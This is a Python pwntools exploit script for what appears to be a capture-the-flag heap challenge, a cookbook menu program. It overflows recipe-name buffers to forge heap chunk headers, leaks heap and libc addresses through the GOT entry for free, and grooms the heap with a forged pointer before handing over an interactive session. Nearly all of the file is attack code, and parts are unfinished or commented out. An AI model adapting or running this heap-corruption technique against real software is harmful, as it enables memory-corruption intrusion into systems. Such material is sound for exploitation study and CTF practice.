#!/usr/bin/python
from pwn import *
file=ELF("./cm")
#libc=ELF("")
io=process("./cm")

#[l]ist ingredients
#[r]ecipe book
#[a]dd ingredient
#[c]reate recipe
#[e]xterminate ingredient
#[d]elete recipe
#[g]ive your cookbook a name!
#[R]emove cookbook name
#[q]uit
def debug(heap_base):
	sc=""
	sc="b *0x8048b98\nx 0x804d084\nx 0x804d094\n x 0x804d09c \nx 0x804d0a0\n x /30x "+str(heap_base+0x16a8)
	pwnlib.gdb.attach(io,sc)

def give_cooker_name(name):
	io.sendline("li")
	io.recvuntil("[q]uit")
def list_all_ingredients():
	io.sendline("l")
	content=io.recvuntil("=")[:-1]
	io.recvuntil("[q]uit")
def add_ingredient(name):
	io.sendline("a")
	io.sendline("n")
	io.sendline("g")
	io.sendline(name)
	io.sendline("e")
	io.sendline("q")
	io.recvuntil("[R]emove cookbook name")
	io.recvuntil("[q]uit")
def create_recipe():
	io.sendline("c")
	io.recvuntil("[q]uit")
	io.sendline("n")
	io.recvuntil("[q]uit")

def end_op_recipe():
	io.sendline("q")
	io.recvuntil("[q]uit")

def create_recipe_and_leave():
	create_recipe()
	end_op_recipe()
def add_ingredient_in_recipe(ingredient):
	io.sendline("a")
	io.sendline(ingredient)
	io.sendline("0")
	io.recvuntil("[q]uit")
def rename_recipe(name):
	io.sendline("i")
	io.sendline(name)
	#io.recvuntil("[q]uit")
def del_ingredient_in_recipe(ingredient):
	io.sendline("r")
	io.sendline(ingredient)  #that free is fucking stupid
 	io.recvuntil("[q]uit")
def discard_recipe():
	io.sendline("d")
	io.recvuntil("[q]uit")


	#io.sendline("s")
	#io.recvuntil
def remove_ingredient(name):
	io.sendline("e")
	io.sendline(name)
	io.recvuntil("[q]uit")

def leak():
	nop=(0x760-0x358-0x8c)*"a"
	pre_size=0
	size=0x11
	dishes=0x804d08c
	got_free=0x804d018
	ptr=dishes
	leak_buf=nop+p32(pre_size)+p32(size)+p32(ptr)+p32(0)
	#add_ingredient_in_recipe("water")
	rename_recipe(leak_buf)
	io.sendline("p")
	io.recvuntil(" - ")
	content=io.recvuntil("\n")[:-1]
	rate=1
	heap_base=0
	for t in content:
		heap_base+=rate*ord(t)
		rate*=256
	rate=1
	ptr=got_free
	leak_buf=nop+p32(pre_size)+p32(size)+p32(ptr)+p32(0)
	rename_recipe(leak_buf)
	io.sendline("p")
	io.recvuntil(" - ")
	content=io.recvuntil("\n")[:4]
	rate=1
	free_addr=0
	for t in content:
		free_addr+=rate*ord(t)
		rate*=256
	free_addr+=0xf758e380-0xf757b070
	heap_base-=0x580
	del_ingredient_in_recipe("cola")
	io.sendline("d")
	io.sendline("q")
	print hex(heap_base)
	print hex(free_addr)
	io.recvuntil("=")
	io.recvuntil("[q]uit\n")
	return (heap_base,free_addr)
#main


give_cooker_name("li")
cola="cola"
remove_ingredient("water")
remove_ingredient("tomato")
remove_ingredient("basil")
remove_ingredient("garlic")
remove_ingredient("onion")
remove_ingredient("lemon")
remove_ingredient("corn")
remove_ingredient("olive oil")

add_ingredient(cola)
create_recipe()
add_ingredient_in_recipe(cola)

heap_base,free_addr=leak()
remove_ingredient("cola")
add_ingredient("hello")
#here needs to do something else

create_recipe_and_leave()
create_recipe_and_leave()
add_ingredient("nop1")
add_ingredient("nop2")
add_ingredient("nop3")
add_ingredient("nop4")
add_ingredient("nop5")
add_ingredient("nop6")
io.sendline("g")
io.sendline("0x80")
io.sendline(0x79*"a")
io.recvuntil("[q]uit")
create_recipe_and_leave()
io.sendline("g")
io.sendline("0x10")
io.sendline(0x9*"a")
create_recipe_and_leave()
io.sendline("g")
io.sendline("0x10")
io.sendline(0x9*"a")
io.sendline("R")
io.sendline("c")
io.sendline("g")
payload=0x37c*"c"
payload+=p32(0x0)
payload+=p32(0x19)
payload+=p32(0x804cf28)
io.sendline(payload)

io.sendline("q")
io.sendline("g")
io.sendline("0x10")
io.sendline(0x9*"b")
io.sendline("g")
debug(heap_base)
io.sendline("0x10")
io.sendline(0x9*"a")
#create_recipe()
#add_ingredient_in_recipe("hello")
#buf='a'*(0x6a8-0x8c-0x2a0)
#fake2global=0x0804d09c
#buf+=p32(0)+p32(0x11)+p32(ingredient_1)+p32(fake2global)+p32(0)+p32(0x11)
#rename_recipe(buf)
#end_op_recipe()

#create_recipe_and_leave()
#add_ingredient("overflow")










#io.sendline("p")




io.interactive()